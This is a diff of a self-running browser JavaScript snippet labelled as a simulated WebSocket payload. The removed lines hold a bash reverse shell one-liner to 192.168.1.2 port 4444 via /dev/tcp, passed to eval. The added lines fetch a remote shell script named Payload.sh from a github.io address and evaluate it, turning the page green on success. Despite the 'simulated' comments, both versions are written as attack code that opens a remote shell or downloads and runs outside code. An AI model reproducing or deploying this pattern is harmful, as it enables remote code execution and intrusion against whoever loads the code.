@@ -1,22 +1,25 @@
 (function () {
-    // Simulated WebSocket reverse shell command
-    const simulatedWebSocketCommand = `
-        bash -c 'exec 5<>/dev/tcp/192.168.1.2/4444;cat <&5 | while read line; do $line 2>&5 >&5; done'
-    `;
+    // Simulated WebSocket payload URL
+    const simulatedWebSocketPayloadURL = "https://raoufdz28.github.io/files/Payload.sh";
 
-    // Function to simulate receiving a WebSocket message
-    function executeSimulatedCommand(command) {
+    // Function to simulate receiving a WebSocket message and executing a payload
+    async function executeSimulatedPayload(payloadURL) {
         try {
-            // Construct a function to execute the reverse shell command
-            const exec = new Function(`return function() { return eval(\`${command}\`); }`)();
-            exec(); // Execute the command
+            // Fetch the payload from the provided URL
+            const response = await fetch(payloadURL);
+            const payload = await response.text();
+
+            // Dynamically construct a function to execute the payload
+            const exec = new Function(`return function() { return eval(\`${payload}\`); }`)();
+            exec(); // Execute the fetched payload
+
             document.body.style.backgroundColor = "green"; // Indicate success
         } catch (error) {
-            console.error("Command execution failed:", error);
+            console.error("Payload execution failed:", error);
             document.body.style.backgroundColor = "red"; // Indicate failure
         }
     }
 
-    // Simulate receiving a message from the WebSocket and executing it
-    executeSimulatedCommand(simulatedWebSocketCommand);
+    // Simulate receiving the payload from the WebSocket
+    executeSimulatedPayload(simulatedWebSocketPayloadURL);
 })();
